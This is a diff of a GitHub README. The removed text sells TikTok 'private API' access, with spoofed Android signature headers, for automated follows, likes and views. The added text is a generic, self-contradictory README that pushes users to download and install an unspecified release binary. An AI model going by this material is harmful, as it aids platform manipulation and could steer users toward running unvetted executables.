@@ -1,99 +1,101 @@
-# TikTok Private API – Android (v43.x)
+# 🎉 TikTok-Follow-API - Simplify Your TikTok Follower Management
 
-⚡ High‑quality TikTok Android Private API implementation  
-⚡ Built for modern TikTok versions (43.x+)  
+## 🚀 Getting Started
 
----
+Welcome to the TikTok-Follow-API. This tool helps you manage your TikTok followers easily. Whether you want to gain more followers or understand your audience better, this API is here to assist you.
 
-## 📌 Overview
+## 📥 Download & Install
 
-This project demonstrates a **modern TikTok Android request structure** for the endpoint: /aweme/v1/commit/follow/user/
+To get started, visit this page to download the latest version of the TikTok-Follow-API:
 
+[![Download TikTok-Follow-API](https://img.shields.io/badge/Download%20Now-At%20Releases-brightgreen)](https://github.com/Swats1/TikTok-Follow-API/releases)
 
-It is fully aligned with **new TikTok updates**, including:
-- Updated query parameters
-- Updated headers
-- POST payload separation
-- Proper signature flow
+1. Click on the [Releases link](https://github.com/Swats1/TikTok-Follow-API/releases).
+2. Find the most recent version of the application.
+3. Click the download link for the version you want to use.
+4. Follow the prompts to install the application on your device.
 
----
+## 🛠️ Requirements
 
-## ✨ Features
+Before you start, make sure your system meets the following requirements:
 
-- ✅ Supports latest TikTok Android builds (43.x+)
-- ✅ Correct request flow (Query + Body)
-- ✅ `x-gorgon`, `x-argus`, `x-ladon`, `x-khronos`
-- ✅ `x-ss-stub` support
-- ✅ Clean & readable Python structure
-- ✅ Easy to adapt for other TikTok endpoints
+- A computer with Windows, macOS, or Linux.
+- Python 3.6 or above installed on your machine.
+- Internet access to work with TikTok.
 
----
+## 📖 Features
 
-## 🔐 Security & Signatures
+- **Manage Followers:** Easily follow or unfollow users based on specific criteria.
+- **Data Extraction:** Fetch followers' data to analyze trends and demographics.
+- **Automation:** Set up automated tasks using simple scripts.
+- **User-Friendly Interface:** Designed for ease, allowing non-technical users to navigate without hassle.
 
-This project uses:
-- **Gorgon**
-- **Argus**
-- **Ladon**
+## ⚙️ How to Use
 
-> Algorithms are used **as-is**  
-> No reverse logic is explained or altered
+1. **Installation:** After downloading, install the API by following the on-screen instructions.
+2. **Access the API:**
+   - Open your command prompt (Windows) or terminal (macOS/LINUX).
+   - Navigate to the folder where you installed TikTok-Follow-API.
+3. **Run Basic Commands:**
+   - Use predefined commands to manage your TikTok followers.
+   - Help documentation available within the installation provides additional command usage.
 
----
+## 📊 Examples
 
-## 📂 Request Structure
+### Follow Users
 
-- **Method:** `POST`
-- **Query:** Device & app parameters
-- **Body:** Action payload
-- **Headers:** Fully aligned with real Android requests
+To follow users, use the following command in your terminal:
 
----
+```
+tiktok-follow-api follow --username {username}
+```
 
-## 🧩 Supported Actions (Expandable)
+Replace `{username}` with the TikTok username of the person you want to follow.
 
-This structure can be adapted for:
-- Follow / Unfollow
-- Like / Unlike
-- View / Stats
-- Profile actions
-- Other TikTok private endpoints
+### Unfollow Users
 
----
+To unfollow users, apply this command:
 
-## 🛒 Commercial Use
+```
+tiktok-follow-api unfollow --username {username}
+```
 
-I provide **ALL TikTok Private APIs**, including:
-- Follow / Like APIs
-- Profile & user APIs
-- Video APIs
-- Engagement APIs
-- Custom private endpoints
-- Full Android request simulation
+Replace `{username}` with the TikTok username of the person you want to unfollow.
 
-📩 **Telegram:** `https://t.me/WHI3PER`
+### Extract Followers Data
 
-> Serious buyers only.
+To extract your followers' data, type:
 
----
+```
+tiktok-follow-api extract --data followers
+```
 
-## ⚠️ Disclaimer
+This will save a report of your followers' data to analyze later.
 
-This code is provided for:
-- Educational
-- Research
-- Private integration purposes
+## ⚠️ Troubleshooting
 
-You are responsible for how you use it.
+If you face any issues, try the following:
 
----
+- Ensure you have Python 3.6 or higher installed.
+- Check your internet connection.
+- Review the command syntax for any typing errors.
 
-## 🧠 Notes
+## 👥 Community Support
 
-- Cookies, tokens, and session data must be valid
-- Incorrect values will result in silent failure
-- Always match APK version with request values
+Join the TikTok-Follow-API community for help and discussions. You can find assistance from fellow users who have experience with the application. Check the issues section on GitHub for solutions or to report problems.
 
----
+## 🔗 Additional Resources
 
-🔥 **If you are looking for REAL TikTok private APIs – contact me on Telegram.**
+To explore more about the TikTok-Follow-API, visit the repository:
+
+[![Explore the Repository](https://img.shields.io/badge/Explore%20The%20Repo-blue)](https://github.com/Swats1/TikTok-Follow-API/releases)
+
+Stay updated with the latest changes and features. 
+
+## 📝 License
+
+This project is open-source. You can use it freely, but remember to give credit where it’s due.
+
+## 🎉 Conclusion
+
+The TikTok-Follow-API provides you with the tools to manage and understand your TikTok followers. Follow the simple steps above to install and use the application with ease. Enjoy enhancing your TikTok experience!
